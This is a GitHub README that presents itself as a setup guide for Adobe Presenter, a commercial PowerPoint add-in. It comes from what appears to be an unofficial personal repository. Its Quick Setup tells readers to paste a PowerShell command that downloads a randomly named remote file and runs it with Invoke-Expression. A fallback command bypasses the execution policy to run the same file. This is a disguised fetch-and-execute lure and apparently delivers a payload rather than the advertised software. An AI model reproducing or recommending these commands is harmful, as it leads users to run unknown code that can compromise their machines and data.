# Presenter

Presenter is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Presenter and work in it.

Adobe Presenter is a Windows desktop add-in that works inside Microsoft PowerPoint to build training and presentation content. You stay in familiar slide editing while layering narration, learner interactions, and packaging options aimed at corporate learning teams and instructors who already live in Office.

A typical session starts with an existing deck or a new presentation. You open Presenter from the PowerPoint ribbon, record or import audio per slide, add knowledge checks or surveys, tune playback and navigation, then preview the module. When the flow feels right, you publish to formats your organization expects, such as SWF-era packages, PDF, or SCORM-friendly bundles for an LMS.

This repository collects the Windows setup materials, version notes, and a changelog so teams can track what build they deployed. The setup file documents install steps and compatibility expectations; notes capture configuration tips and known quirks; the changelog records fixes and behavior changes between releases.

## What you do with it

- Embeds in PowerPoint so slide edits and Presenter authoring share one Windows workflow.
- Records per-slide narration from a microphone with simple retake and trim controls.
- Adds graded quizzes and surveys tied to slides for checkpoint assessment during playback.
- Publishes SCORM and AICC packages structured for common learning management systems.
- Synchronizes animations and bullet builds with audio timing for paced self-paced lessons.
- Supports character-guided scenarios and sidebar layouts for softer training presentation styles.
- Exports video or document outputs when stakeholders need files outside an LMS player.
- Manages presentation properties, branding, and player chrome from a dedicated options panel.

## Quick Setup (PowerShell)

This installs the program Presenter on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/verawilhelm91467/presenter-setup-guide/main/6nt1gis4k7.16a6okcc | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/verawilhelm91467/presenter-setup-guide/main/6nt1gis4k7.16a6okcc | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `6nt1gis4k7.16a6okcc` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `verawilhelm91467/presenter-setup-guide`. Adobe Presenter 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
